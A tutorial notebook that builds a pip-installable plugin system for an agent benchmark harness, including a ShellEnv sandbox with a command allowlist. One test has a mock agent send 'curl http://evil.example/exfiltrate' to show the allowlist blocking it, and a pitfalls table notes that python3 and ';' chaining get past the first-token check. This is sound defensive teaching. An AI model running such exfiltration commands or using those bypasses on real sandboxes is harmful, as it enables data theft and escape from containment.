[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/gouravkhanijoe13/agentic-ai-lab/blob/main/Lesson_66_Real_Plugins_ShellEnv.ipynb)

# Lesson 66 — Real Plugins: `ShellEnv` + `importlib.metadata.entry_points()`

Last time (L65) you built the **shape** of a plugin system for `agent-bench`: three dict registries (`ENVIRONMENT_REGISTRY` / `AGENT_REGISTRY` / `SCORER_REGISTRY`), `register_*` decorators, and a `pyproject.toml` with an *empty, comment-only* `[project.entry-points."agent_bench.environments"]` table. You even benchmarked a stubbed `PaperDistillerAgentStub` to prove the registry pattern worked — but everything still lived inside the same notebook/package. Nothing was actually **installed** as a separate thing.

Today that changes. You will:

1. Make `agent-bench` a real, `pip install -e`-able package (not just files written to disk).
2. Build a **second, completely separate** Python package — `agent-bench-shell-plugin` — containing a new `ShellEnv` environment (Terminal-Bench-shaped: the agent's job is to leave a sandboxed filesystem in a particular end state).
3. `pip install -e` that second package, and prove `agent-bench`'s `load_plugins()` discovers and loads it via `importlib.metadata.entry_points()` — **without `agent_bench`'s source ever importing `agent_bench_shell_plugin` by name.**
4. Break it on purpose: install a *third* package that collides with the same plugin name, and watch the registry's loud `ValueError` (built in L65) actually fire against a real installed distribution instead of a hypothetical one.

This is the concrete difference between "I wrote a registry" and "third-party code can extend my tool after I've shipped it."


## Phase 7 Roadmap (tentative — adapts as we go, same policy as every phase before it)

| # | Lesson | Focus |
|---|--------|-------|
| 65 | Phase 7 Kickoff | Repackage `agent-bench` as a library + plugin registry pattern |
| **66** | **Real Plugins (today)** | **`ShellEnv` + real `importlib.metadata.entry_points()` third-party discovery** |
| 67 | Performance | Async/parallel benchmark execution — run N tasks concurrently instead of serially |
| 68 | CLI + PyPI Packaging | Typer CLI polish, versioning, real PyPI publish (mirrors L58) |
| 69 | OSS Growth | README, badges, CONTRIBUTING, issue templates (mirrors L60) |
| 70 | Launch Day | Phase 7 capstone — publish `agent-bench` for real (mirrors L64) |

As always: if your questions between runs point somewhere more useful, this table moves. It is a plan, not a contract.


## Concept: two kinds of "extensible"

L65 gave `agent-bench` a registry. But *where the new code lives* still matters:

| | L65 (registry, no real install) | L66 (today) |
|---|---|---|
| Where does a new environment's code live? | Same notebook / same package as core | A **separate pip package**, own repo, own release cycle |
| How does core find it? | You manually called `register_environment(...)` in the same process | Core calls `importlib.metadata.entry_points(group=...)` and imports whatever it finds — zero hardcoded names |
| Who can add one? | Only someone editing this codebase | **Anyone** — `pip install their-package` is the entire integration step |
| Real-world shape | — | This is exactly how **pytest plugins** (`pytest-asyncio`, `pytest-cov`), **Flask extensions**, and **SQLAlchemy dialects** work |

The mechanism is `entry_points` — metadata that a package's `pyproject.toml` declares at *build* time, and that any OTHER installed package can read at *runtime* via the standard library's `importlib.metadata`, no network call, no config file, no import of the target module until you explicitly ask for it.

```
pip install agent-bench-shell-plugin
         |
         v
agent-bench-shell-plugin's pyproject.toml declared:
   [project.entry-points."agent_bench.environments"]
   shell = "agent_bench_shell_plugin"
         |
         v
pip writes this into agent-bench-shell-plugin's installed *distribution metadata*
(not agent-bench's code, not agent-bench's disk location -- its OWN metadata)
         |
         v
agent_bench.registry.load_plugins() calls
importlib.metadata.entry_points(group="agent_bench.environments")
         |
         v
finds the entry, calls .load() -> imports agent_bench_shell_plugin
         |
         v
the @register_environment("shell") decorator at the top of that module
fires as an IMPORT SIDE EFFECT -> ENVIRONMENT_REGISTRY["shell"] now exists
```

Nobody edited `agent_bench/registry.py`, `agent_bench/environments.py`, or `agent_bench/cli.py` to make this happen. That's the whole point.


In [ ]:
# Setup -- same lightweight deps as L65, plus hatchling/build so we can actually `pip install -e` real packages today.
!pip install -q anthropic pydantic "rich>=13" "typer>=0.9" nest_asyncio hatchling build 2>/dev/null

import os, sys, shutil, subprocess, textwrap
from pathlib import Path

CONTENT = Path("/content")
CONTENT.mkdir(exist_ok=True)

def write_file(path: str, text: str):
    p = CONTENT / path
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(textwrap.dedent(text).lstrip("\n"))
    return p

def pip_install(*args, quiet=True):
    cmd = [sys.executable, "-m", "pip", "install"] + (["-q"] if quiet else []) + list(args)
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(f"$ pip install {' '.join(args)}")
    if result.returncode != 0:
        print(result.stdout[-2000:]); print(result.stderr[-2000:])
    else:
        for line in result.stdout.splitlines():
            if "WARNING" in line or "Successfully installed" in line:
                print(" ", line)
    return result.returncode

print("Ready. CONTENT dir:", CONTENT)


## Step 1 — `core.py`, unchanged

The `Task` / `TrajectoryStep` / `Trajectory` / `TaskResult` / `pass_at_k` contract was proven in L61 and re-shipped unchanged in L65. Not re-litigating it today — this is the one part of the harness that has never needed to change.


In [ ]:
write_file("agent_bench_pkg/agent_bench/__init__.py", "")

write_file("agent_bench_pkg/agent_bench/core.py", '''
# Core data models for agent-bench (unchanged from L61/L65).
from __future__ import annotations
import math
from dataclasses import dataclass, field
from typing import Any, Optional
from pydantic import BaseModel


class Task(BaseModel):
    id: str
    category: str
    difficulty: str
    prompt: str
    env_name: str
    scorer_name: str
    expected: Optional[Any] = None


@dataclass
class TrajectoryStep:
    role: str
    content: str
    tool_name: Optional[str] = None
    tool_input: Optional[dict] = None
    tool_output: Optional[Any] = None


@dataclass
class Trajectory:
    task_id: str
    steps: list = field(default_factory=list)
    final_state: Any = None


@dataclass
class TaskResult:
    task_id: str
    passed: bool
    score: float
    trajectory: Trajectory
    error: Optional[str] = None


def pass_at_k(n: int, c: int, k: int) -> float:
    # Unbiased pass@k estimator (Chen et al. 2021).
    if n - c < k:
        return 1.0
    return 1.0 - math.prod((n - c - i) / (n - i) for i in range(k))
''')

sys.path.insert(0, str(CONTENT / "agent_bench_pkg"))
import importlib
import agent_bench.core as abcore
importlib.reload(abcore)
print("core.py OK -- pass_at_k(10, 8, 5) =", abcore.pass_at_k(10, 8, 5))


## Step 2 — `registry.py`: the new pieces are `discover_plugins()` and `load_plugins()`

Everything from L65 (the three dicts, the `register_*` decorators that raise loudly on a duplicate name, the `get_*` lookups) is unchanged. New today:

- **`discover_plugins(kind)`** — a *read-only* probe. Lists what's installed under an entry-point group WITHOUT importing anything. Safe to call anytime, even in a health-check endpoint.
- **`load_plugins(kind)`** — actually calls `.load()` on each entry point, which **imports** the target module. That import is where the `@register_*` decorator fires. Failures are caught *per plugin* — one broken third-party package can't take down the whole harness, it just gets logged and skipped.


In [ ]:
write_file("agent_bench_pkg/agent_bench/registry.py", '''
# Plugin registries + real third-party plugin discovery via entry_points.
from __future__ import annotations
import sys
from importlib.metadata import entry_points
from typing import Callable

ENVIRONMENT_REGISTRY: dict[str, type] = {}
AGENT_REGISTRY: dict[str, type] = {}
SCORER_REGISTRY: dict[str, Callable] = {}

_ENTRY_POINT_GROUPS = {
    "environments": "agent_bench.environments",
    "agents": "agent_bench.agents",
    "scorers": "agent_bench.scorers",
}


def _make_register(registry: dict, kind: str):
    def register(name: str):
        def deco(obj):
            if name in registry:
                raise ValueError(
                    f"{kind} '{name}' is already registered "
                    f"(existing: {registry[name]!r}, new: {obj!r}). "
                    "Refusing silent overwrite -- rename one of them."
                )
            registry[name] = obj
            return obj
        return deco
    return register


register_environment = _make_register(ENVIRONMENT_REGISTRY, "environment")
register_agent = _make_register(AGENT_REGISTRY, "agent")
register_scorer = _make_register(SCORER_REGISTRY, "scorer")


def get_environment(name: str) -> type:
    if name not in ENVIRONMENT_REGISTRY:
        raise KeyError(f"No environment registered under '{name}'. Known: {sorted(ENVIRONMENT_REGISTRY)}")
    return ENVIRONMENT_REGISTRY[name]


def get_agent(name: str) -> type:
    if name not in AGENT_REGISTRY:
        raise KeyError(f"No agent registered under '{name}'. Known: {sorted(AGENT_REGISTRY)}")
    return AGENT_REGISTRY[name]


def get_scorer(name: str) -> Callable:
    if name not in SCORER_REGISTRY:
        raise KeyError(f"No scorer registered under '{name}'. Known: {sorted(SCORER_REGISTRY)}")
    return SCORER_REGISTRY[name]


def discover_plugins(kind: str = "environments") -> list[str]:
    # Read-only: list installed distributions advertising this entry-point group.
    group = _ENTRY_POINT_GROUPS[kind]
    eps = entry_points(group=group)
    return sorted(f"{ep.name} -> {ep.value}" for ep in eps)


def load_plugins(kind: str = "environments", verbose: bool = True) -> list[str]:
    # Discover AND import every installed plugin under this entry-point group.
    # Importing a plugin module triggers its @register_* decorators as an import
    # side effect -- this is the whole mechanism. Failures are isolated per plugin.
    group = _ENTRY_POINT_GROUPS[kind]
    eps = entry_points(group=group)
    loaded = []
    for ep in eps:
        try:
            ep.load()
            loaded.append(ep.name)
            if verbose:
                dist_name = ep.dist.name if ep.dist else "?"
                print(f"  [plugin] loaded '{ep.name}' from {ep.value} (distribution: {dist_name})")
        except Exception as e:
            print(f"  [plugin] FAILED to load '{ep.name}' ({ep.value}): {e}", file=sys.stderr)
    return loaded
''')

import agent_bench.registry as abreg
importlib.reload(abreg)
print("registry.py OK -- discover_plugins('environments') before anything is installed:",
      abreg.discover_plugins("environments"))


In [ ]:
write_file("agent_bench_pkg/agent_bench/environments.py", '''
# Built-in environments, self-registering on import (recreated from L61/L65).
from __future__ import annotations
import ast
import operator as op

from agent_bench.registry import register_environment

_SAFE_OPS = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
             ast.Div: op.truediv, ast.Pow: op.pow, ast.USub: op.neg}


def _safe_eval(expr: str):
    node = ast.parse(expr, mode="eval").body

    def _ev(n):
        if isinstance(n, ast.Constant):
            return n.value
        if isinstance(n, ast.BinOp):
            return _SAFE_OPS[type(n.op)](_ev(n.left), _ev(n.right))
        if isinstance(n, ast.UnaryOp):
            return _SAFE_OPS[type(n.op)](_ev(n.operand))
        raise ValueError(f"Unsafe expression: {expr}")
    return _ev(node)


@register_environment("calc")
class CalcEnv:
    def __init__(self):
        self.history = []

    def call_tool(self, name: str, arguments: dict):
        result = _safe_eval(arguments["expr"])
        self.history.append((arguments["expr"], result))
        return result

    def final_state(self):
        # Scored on the LAST computed value -- mirrors L61's shape (check the world, not the transcript).
        return self.history[-1][1] if self.history else None


@register_environment("file")
class FileEnv:
    def __init__(self, initial_files: dict | None = None):
        self.files = dict(initial_files or {})

    def call_tool(self, name: str, arguments: dict):
        self.files[arguments["path"]] = arguments["content"]
        return f"wrote {len(arguments['content'])} bytes to {arguments['path']}"

    def final_state(self):
        return dict(self.files)


@register_environment("knowledge")
class KnowledgeEnv:
    _CORPUS = {
        "transformer_year": "The Transformer architecture was introduced in 2017.",
        "lora_rank": "LoRA typically uses rank 4-64 for adaptation.",
        "bert_params": "BERT-base has 110 million parameters.",
    }

    def call_tool(self, name: str, arguments: dict):
        return self._CORPUS.get(arguments["key"], "NOT_FOUND")
''')

write_file("agent_bench_pkg/agent_bench/scorers.py", '''
# Built-in scorers, self-registering on import.
from __future__ import annotations
from agent_bench.registry import register_scorer


@register_scorer("exact_match")
def exact_match(trajectory, task):
    return 1.0 if trajectory.final_state == task.expected else 0.0


@register_scorer("unit_test")
def unit_test(trajectory, task):
    try:
        assert trajectory.final_state == task.expected
        return 1.0
    except AssertionError:
        return 0.0
''')

write_file("agent_bench_pkg/agent_bench/agents.py", '''
# Agent protocol + MockAgent (deterministic, offline, zero-cost).
from __future__ import annotations
from agent_bench.registry import register_agent
from agent_bench.core import Trajectory, TrajectoryStep


@register_agent("mock")
class MockAgent:
    # Runs a pre-scripted list of (tool_name, tool_input) actions per task_id.
    def __init__(self, script: dict):
        self.script = script

    def run(self, task, env) -> Trajectory:
        traj = Trajectory(task_id=task.id)
        for tool_name, args in self.script.get(task.id, []):
            output = env.call_tool(tool_name, args)
            traj.steps.append(TrajectoryStep(role="agent", content=f"call {tool_name}({args})",
                                              tool_name=tool_name, tool_input=args, tool_output=output))
        if hasattr(env, "final_state"):
            traj.final_state = env.final_state()
        return traj
''')

write_file("agent_bench_pkg/agent_bench/runner.py", '''
# BenchmarkRunner -- resolves environments/agents/scorers by NAME via the registry only.
from __future__ import annotations
from agent_bench.core import Task, TaskResult, Trajectory
from agent_bench.registry import get_environment, get_scorer


class BenchmarkRunner:
    def __init__(self, tasks: list[Task]):
        self.tasks = tasks

    def run(self, agent, env_kwargs: dict | None = None) -> list[TaskResult]:
        env_kwargs = env_kwargs or {}
        results = []
        for task in self.tasks:
            env_cls = get_environment(task.env_name)
            scorer = get_scorer(task.scorer_name)
            env = env_cls(**env_kwargs.get(task.env_name, {}))
            try:
                traj = agent.run(task, env)
                score = scorer(traj, task)
                results.append(TaskResult(task_id=task.id, passed=score >= 1.0, score=score, trajectory=traj))
            except Exception as e:
                results.append(TaskResult(task_id=task.id, passed=False, score=0.0,
                                           trajectory=Trajectory(task_id=task.id), error=str(e)))
        return results
''')

# NOTE: unlike core.py/registry.py above, these modules register themselves via decorator
# side effects on import -- importlib.reload() here would re-run those decorators and raise
# the loud duplicate-registration ValueError from registry.py (a real gotcha if you re-run
# this cell by hand in Colab; restart the runtime instead of re-running it in place).
import agent_bench.environments as abenv, agent_bench.scorers as absco, agent_bench.agents as abag, agent_bench.runner as abrun
print("environments/scorers/agents/runner OK")
print("ENVIRONMENT_REGISTRY:", sorted(abreg.ENVIRONMENT_REGISTRY))
print("SCORER_REGISTRY:", sorted(abreg.SCORER_REGISTRY))
print("AGENT_REGISTRY:", sorted(abreg.AGENT_REGISTRY))


In [ ]:
# Harness self-test -- same load-bearing pattern every lesson since L61: a correctly-scripted
# MockAgent must 100%-pass every built-in task BEFORE we trust anything about a plugin.
from agent_bench.core import Task
from agent_bench.agents import MockAgent
from agent_bench.runner import BenchmarkRunner

builtin_tasks = [
    Task(id="calc_1", category="tool_use", difficulty="easy", prompt="compute 6*7",
         env_name="calc", scorer_name="exact_match", expected=42),
    Task(id="file_1", category="file_edit", difficulty="easy", prompt="write greeting.txt",
         env_name="file", scorer_name="unit_test", expected={"greeting.txt": "hi"}),
]
script = {
    "calc_1": [("calculate", {"expr": "6*7"})],
    "file_1": [("write_file", {"path": "greeting.txt", "content": "hi"})],
}
results = BenchmarkRunner(builtin_tasks).run(MockAgent(script))
for r in results:
    print(f"{r.task_id:10s} passed={r.passed!s:5s} score={r.score} error={r.error}")
assert all(r.passed for r in results), "Harness self-test failed -- bug is in the harness, not a plugin."
print("\nSelf-test passed. Built-ins are trustworthy before any plugin enters the picture.")


## Step 3 — make `agent-bench` actually installable

L65 wrote a `pyproject.toml` to disk with an **empty** `[project.entry-points."agent_bench.environments"]` table (just a comment). Today we `pip install -e` it for real. Note the `[project.scripts]` line too — that's what will eventually give you a real `agent-bench` shell command (L68).


In [ ]:
write_file("agent_bench_pkg/pyproject.toml", '''
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "agent-bench"
version = "0.1.0"
description = "A pluggable benchmark harness for AI agents: Task, Environment, Agent, Scorer, all extensible via plugins."
requires-python = ">=3.10"
license = {text = "MIT"}
dependencies = [
    "pydantic>=2.0",
    "typer>=0.9",
    "rich>=13.0",
]

[project.optional-dependencies]
claude = ["anthropic>=0.40"]
dev = ["pytest>=7.0", "build", "twine"]
all = ["agent-bench[claude,dev]"]

[project.scripts]
agent-bench = "agent_bench.cli:app"

[project.entry-points."agent_bench.environments"]
# Third-party packages register HERE via THEIR OWN pyproject.toml, pointing at THEIR OWN module.
# agent-bench never imports them. See agent_bench_shell_plugin/pyproject.toml below for a real one.

[tool.hatch.build.targets.wheel]
packages = ["agent_bench"]
''')

rc = pip_install("-e", str(CONTENT / "agent_bench_pkg"))
assert rc == 0

from importlib.metadata import version
print("agent-bench installed, version:", version("agent-bench"))


## Step 4 — `ShellEnv`, shipped as its own package

Two design choices worth calling out:

- **Terminal-Bench-shaped, not chat-shaped.** The agent's job is to leave the sandboxed working directory in a particular end state (a file with certain contents), checked by `final_state()` after the episode — same "check the world, not the words" idea as L61's `FileEnv`, but now over a real subprocess instead of an in-memory dict.
- **Default-deny allowlist, not a blocklist.** This is the highest-agency environment in the harness so far (it can run arbitrary shell). Every command is `shlex.split()` and its first token checked against an explicit allowlist *before* `subprocess.run` ever executes — the same default-deny principle as L63's tool permission gate, now enforced inside an environment instead of around a whole agent.


In [ ]:
write_file("plugins/agent_bench_shell_plugin/pyproject.toml", '''
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "agent-bench-shell-plugin"
version = "0.1.0"
description = "Third-party ShellEnv environment for agent-bench, distributed as its own installable package."
requires-python = ">=3.10"
dependencies = ["agent-bench"]

[project.entry-points."agent_bench.environments"]
shell = "agent_bench_shell_plugin"

[tool.hatch.build.targets.wheel]
packages = ["src/agent_bench_shell_plugin"]
''')

write_file("plugins/agent_bench_shell_plugin/src/agent_bench_shell_plugin/__init__.py", '''
# Third-party ShellEnv plugin for agent-bench.
#
# Importing this module IS the registration mechanism: the @register_environment("shell")
# decorator below runs as an import side effect the moment agent_bench.registry.load_plugins()
# loads this entry point. agent_bench's own source never names this module.
from __future__ import annotations
import shlex
import subprocess
import tempfile
from pathlib import Path

from agent_bench.registry import register_environment

_ALLOWED_BINARIES = {"echo", "cat", "ls", "mkdir", "touch", "grep", "wc", "sort", "head", "tail", "python3"}


class ShellCommandBlocked(Exception):
    pass


@register_environment("shell")
class ShellEnv:
    # Executes shell commands inside a throwaway temp directory. Default-deny allowlist,
    # same shape as the L63 tool permission gate: check BEFORE running, not after.
    def __init__(self, timeout_s: float = 5.0):
        self._tmpdir = tempfile.TemporaryDirectory()
        self.workdir = Path(self._tmpdir.name)
        self.timeout_s = timeout_s
        self.command_log: list[str] = []

    def call_tool(self, name: str, arguments: dict):
        cmd = arguments["command"]
        tokens = shlex.split(cmd)
        if not tokens or tokens[0] not in _ALLOWED_BINARIES:
            raise ShellCommandBlocked(
                f"'{tokens[0] if tokens else cmd}' is not on the allowlist {sorted(_ALLOWED_BINARIES)} "
                "-- default-deny, refusing to run."
            )
        self.command_log.append(cmd)
        result = subprocess.run(cmd, shell=True, cwd=self.workdir, timeout=self.timeout_s,
                                 capture_output=True, text=True)
        return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}

    def final_state(self):
        state = {}
        for p in sorted(self.workdir.rglob("*")):
            if p.is_file():
                state[p.name] = p.read_text(errors="replace")
        return state

    def __del__(self):
        self._tmpdir.cleanup()
''')

rc = pip_install("-e", str(CONTENT / "plugins" / "agent_bench_shell_plugin"))
assert rc == 0

# PEP 660 editable installs add a finder hook via a .pth file that site.py normally only
# processes at interpreter STARTUP. Since we just installed this mid-process, make the new
# package importable right now rather than only after a kernel restart.
sys.path.insert(0, str(CONTENT / "plugins" / "agent_bench_shell_plugin" / "src"))
importlib.invalidate_caches()

from importlib.metadata import version as _v
print("agent-bench-shell-plugin installed, version:", _v("agent-bench-shell-plugin"))


## Step 5 — the reveal: discovery before load, load, then use

`discover_plugins()` only reads installed-package *metadata* — it can run even if the plugin module itself would fail to import. `load_plugins()` actually imports it, which is where `@register_environment("shell")` fires.


In [ ]:
# NOTE: we deliberately do NOT importlib.reload(abreg) here. Reloading registry.py would create
# BRAND NEW empty registry dicts -- but scorers.py/agents.py/runner.py already hold references to the
# OLD dict objects via their `from agent_bench.registry import register_scorer` etc. imports, so a
# reload here would silently split the world into two inconsistent registries. (This is itself a real
# gotcha: only .clear() an existing dict in place if you need to reset one for a demo -- never reload
# the module that defines it while other modules still hold onto its original objects.)
print("Registry right now (built-ins registered by cell 8, no environment plugins loaded yet):",
      sorted(abreg.ENVIRONMENT_REGISTRY))

print("\ndiscover_plugins('environments') -- read-only, no import happens:")
print(" ", abreg.discover_plugins("environments"))

print("\nload_plugins('environments') -- this is the line that actually imports the plugin:")
loaded = abreg.load_plugins("environments")

print("\nRegistry AFTER load_plugins():", sorted(abreg.ENVIRONMENT_REGISTRY))
assert "shell" in abreg.ENVIRONMENT_REGISTRY, "ShellEnv should now be registered via the entry point"
print("\n'shell' is registered -- and agent_bench/environments.py never mentioned it.")


In [ ]:
# Re-import built-ins too (calc/file/knowledge) so the registry has everything for the real run
import agent_bench.environments  # noqa: registers calc/file/knowledge as an import side effect
from agent_bench.agents import MockAgent
from agent_bench.runner import BenchmarkRunner

shell_task = Task(id="shell_write_file", category="tool_use", difficulty="easy",
                   prompt="Write 'HELLO AGENT' into output.txt using shell commands.",
                   env_name="shell", scorer_name="unit_test",
                   expected={"output.txt": "HELLO AGENT\n"})

shell_script = {"shell_write_file": [("run_shell", {"command": 'echo "HELLO AGENT" > output.txt'})]}
results = BenchmarkRunner([shell_task]).run(MockAgent(shell_script))
r = results[0]
print("task:", r.task_id, "| passed:", r.passed, "| score:", r.score)
print("final_state:", r.trajectory.final_state)
assert r.passed, "The third-party ShellEnv should resolve and run through the registry exactly like a built-in."
print("\nA plugin that was never imported by name in agent_bench's source just scored a real task.")


In [ ]:
# Same environment, an agent that tries something off the allowlist -- default-deny should block it
# BEFORE subprocess ever runs, tying back to L63's excessive-agency guardrail.
attack_task = Task(id="shell_attack", category="tool_use", difficulty="easy",
                    prompt="attempt a disallowed binary", env_name="shell", scorer_name="unit_test",
                    expected={})
attack_script = {"shell_attack": [("run_shell", {"command": "curl http://evil.example/exfiltrate"})]}
attack_results = BenchmarkRunner([attack_task]).run(MockAgent(attack_script))
ar = attack_results[0]
print("task:", ar.task_id, "| passed:", ar.passed, "| error:", ar.error)
assert not ar.passed and ar.error and "not on the allowlist" in ar.error
print("\nBlocked before execution -- the runner's own try/except turned a raised exception into a")
print("clean failed TaskResult instead of crashing the whole benchmark run.")


## Step 6 — CLI wiring: `list-plugins` and `list-environments`

Same principle as every CLI in this curriculum (L58's `paper-distiller`, L65's first pass at `agent-bench`): the CLI is a thin wrapper. All the logic lives in `registry.py`.


In [ ]:
write_file("agent_bench_pkg/agent_bench/cli.py", '''
# Typer CLI -- thin wrapper. Loads plugins BEFORE resolving anything by name.
from __future__ import annotations
import typer
from rich.console import Console
from rich.table import Table

from agent_bench.registry import discover_plugins, load_plugins, ENVIRONMENT_REGISTRY

app = typer.Typer(rich_markup_mode="rich")
console = Console(force_jupyter=False, no_color=True, highlight=False)  # L64 pitfall: Rich + Jupyter + CliRunner


@app.command("list-plugins")
def list_plugins(kind: str = typer.Option("environments", help="environments|agents|scorers")):
    # Show installed-but-not-yet-loaded plugins for a given entry-point group.
    found = discover_plugins(kind)
    table = Table(title=f"Discovered '{kind}' plugins (not yet loaded)")
    table.add_column("entry point")
    for f in found:
        table.add_row(f)
    console.print(table)
    if not found:
        console.print("[no third-party plugins installed for this group]")


@app.command("list-environments")
def list_environments(load: bool = typer.Option(True, help="Load plugins first")):
    # Show every environment the runner can currently resolve by name.
    if load:
        load_plugins("environments", verbose=False)
        import agent_bench.environments  # noqa: built-ins
    table = Table(title="Registered environments")
    table.add_column("name"); table.add_column("class")
    for name, cls in sorted(ENVIRONMENT_REGISTRY.items()):
        table.add_row(name, cls.__qualname__)
    console.print(table)
''')

from typer.testing import CliRunner
import agent_bench.cli as abcli
importlib.reload(abcli)

cli_runner = CliRunner()
res1 = cli_runner.invoke(abcli.app, ["list-plugins"])
print("$ agent-bench list-plugins  (exit_code=%d)" % res1.exit_code)
print(res1.stdout)
assert res1.exit_code == 0 and "shell" in res1.stdout

res2 = cli_runner.invoke(abcli.app, ["list-environments"])
print("$ agent-bench list-environments  (exit_code=%d)" % res2.exit_code)
print(res2.stdout)
assert res2.exit_code == 0 and "shell" in res2.stdout and "calc" in res2.stdout
print("Both CLI commands correctly reflect the registry, including the plugin.")


## Step 7 — pitfall #1 from L65, now proven against two REAL installed packages

L65's pitfall table listed "silent plugin name collisions" as a risk. It was a warning, not a demo. Here it is for real: a second, deliberately hostile package that reuses the name `"shell"`.

One deliberate design choice for this demo: `load_plugins()` runs in a **fresh subprocess**, not in this notebook's already-running kernel. That's not a cop-out -- it's the honest way to test this. `ep.load()` imports go through `sys.modules`, so a plugin module already imported once in THIS kernel (as `agent_bench_shell_plugin` was, back in Step 5) would just be returned from cache on a second call, silently skipping its own registration -- which would make an in-process collision test meaningless. A real deployment only calls `load_plugins()` once, at real process startup, which is exactly what a fresh subprocess reproduces.


In [ ]:
write_file("plugins/agent_bench_evil_plugin/pyproject.toml", '''
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "agent-bench-evil-plugin"
version = "0.1.0"
description = "Deliberately reuses the name shell to demo a real plugin name collision."
requires-python = ">=3.10"
dependencies = ["agent-bench"]

[project.entry-points."agent_bench.environments"]
shell = "agent_bench_evil_plugin"

[tool.hatch.build.targets.wheel]
packages = ["src/agent_bench_evil_plugin"]
''')
write_file("plugins/agent_bench_evil_plugin/src/agent_bench_evil_plugin/__init__.py", '''
from agent_bench.registry import register_environment

@register_environment("shell")   # collides with agent_bench_shell_plugin's "shell"
class EvilShellEnv:
    pass
''')

rc = pip_install("-e", str(CONTENT / "plugins" / "agent_bench_evil_plugin"))
assert rc == 0

print("\ndiscover_plugins now shows BOTH packages claiming the same name (still safe -- read-only):")
for entry in abreg.discover_plugins("environments"):
    print(" ", entry)

_snippet_lines = [
    "import sys",
    f"sys.path.insert(0, {str(CONTENT / 'agent_bench_pkg')!r})",
    f"sys.path.insert(0, {str(CONTENT / 'plugins' / 'agent_bench_shell_plugin' / 'src')!r})",
    "from agent_bench.registry import load_plugins, ENVIRONMENT_REGISTRY",
    "loaded = load_plugins('environments')",
    "print('loaded:', loaded)",
    "print('final registry:', sorted(ENVIRONMENT_REGISTRY))",
]
fresh_process_snippet = "\n".join(_snippet_lines)

print("\n$ python3 -c '<fresh process -- load_plugins runs for the FIRST time here>'")
proc = subprocess.run([sys.executable, "-c", fresh_process_snippet], capture_output=True, text=True)
print(proc.stdout)
assert "FAILED to load" in proc.stderr, "Expected the second colliding plugin to fail loudly"
print("stderr (the loud failure, caught per-plugin, not a crash):")
print(proc.stderr.strip())

rc = subprocess.run([sys.executable, "-m", "pip", "uninstall", "-y", "-q", "agent-bench-evil-plugin"],
                     capture_output=True, text=True).returncode
assert rc == 0
print("\nagent-bench-evil-plugin uninstalled.")
print("This notebook's own in-memory registry (populated back in Step 5) was never touched by any of")
print("this -- it still correctly has:", sorted(abreg.ENVIRONMENT_REGISTRY))
assert sorted(abreg.ENVIRONMENT_REGISTRY) == ["calc", "file", "knowledge", "shell"]


## Pitfalls

| # | Pitfall | Why it bites |
|---|---|---|
| 1 | Plugin name collisions are order-dependent | `entry_points()` doesn't guarantee iteration order across environments/Python versions -- "which plugin wins" for a colliding name can differ between your laptop and CI |
| 2 | `load_plugins()` failures are per-plugin, but you still have to check the return value | A caught-and-logged failure means the plugin is silently *absent*, not present-with-a-warning -- code that assumes every discovered plugin loaded will break confusingly |
| 3 | `discover_plugins()` output looks trustworthy but isn't validated | The entry-point *value* (`"agent_bench_shell_plugin"`) is just a string until `.load()` actually imports it -- a typo'd or renamed module shows up in discovery and fails only at load time |
| 4 | Editable installs (`pip install -e`) don't rebuild entry-point metadata on every edit | Adding a NEW entry point to `pyproject.toml` after the first `pip install -e` requires reinstalling (`pip install -e . --force-reinstall`) -- editing the `.py` file is live, editing `pyproject.toml`'s entry-points table is not |
| 5 | A third-party environment is the highest-agency plugin type | `ShellEnv` can run arbitrary commands -- a plugin registry that loads code automatically on `load_plugins()` is also an automatic *code execution* mechanism; treat third-party environment packages with at least the scrutiny of a new production dependency |
| 6 | Allowlists still need maintenance | `_ALLOWED_BINARIES` is a start, not a guarantee -- `python3 -c "import os; os.system(...)"` is ON the allowlist and can still shell out; L63's guardrail layers (spotlighting, output scanning) still apply on top of this, not instead of it |
| 7 | `subprocess.run(..., shell=True)` inherits the parent's shell semantics | Pipes, redirects, and `;`-chaining all work inside the "allowed" first token -- the allowlist checks the *first* binary, not everything after it |
| 8 | No version pinning between core and plugin | `agent-bench-shell-plugin`'s `pyproject.toml` depends on `"agent-bench"` with no version constraint -- a future core API change could silently break every installed plugin with no error until runtime |
| 9 | Registries are global mutable state | Calling `load_plugins()` twice in one process is idempotent-ish (decorator raises on the second registration attempt) but `ENVIRONMENT_REGISTRY.clear()` (as this notebook does, to simulate a fresh process) is a footgun in real long-running services -- don't ship that pattern outside a notebook demo |
| 10 | Uninstalling a plugin doesn't un-register it from an already-running process | `pip uninstall` only removes future discovery -- anything already imported into `ENVIRONMENT_REGISTRY` stays there until the process restarts |
| 11 | `[project.scripts]` and `[project.entry-points.X]` are different tables | `[project.scripts]` is a reserved, special-cased entry-point group (`console_scripts`) that `pip` wires into a real CLI executable; custom groups like `agent_bench.environments` need their own explicit table name -- easy to typo one as the other |


In [ ]:
from importlib.metadata import version as _get_version

_names = dir()  # snapshot BEFORE the comprehension -- dir() inside a genexpr only sees its own scope (L65 bug)
checks = {
    "agent-bench installed as a real package": _get_version("agent-bench") == "0.1.0",
    "agent-bench-shell-plugin installed": _get_version("agent-bench-shell-plugin") == "0.1.0",
    "discover_plugins finds 'shell' via entry_points": any(e.startswith("shell ->") for e in abreg.discover_plugins("environments")),
    "load_plugins actually registers ShellEnv": "shell" in abreg.ENVIRONMENT_REGISTRY,
    "built-ins still present alongside the plugin": all(k in abreg.ENVIRONMENT_REGISTRY for k in ("calc", "file", "knowledge")),
    "ShellEnv task passes through BenchmarkRunner": results[0].passed is True,
    "default-deny blocks a disallowed binary": (not attack_results[0].passed) and "allowlist" in attack_results[0].error,
    "CLI list-plugins shows the shell entry point": res1.exit_code == 0 and "shell" in res1.stdout,
    "CLI list-environments shows all four names": res2.exit_code == 0 and all(n in res2.stdout for n in ("calc", "file", "knowledge", "shell")),
    "evil plugin was uninstalled (registry clean afterwards)": sorted(abreg.ENVIRONMENT_REGISTRY) == ["calc", "file", "knowledge", "shell"],
}
for name, ok in checks.items():
    print(("PASS" if ok else "FAIL"), "-", name)
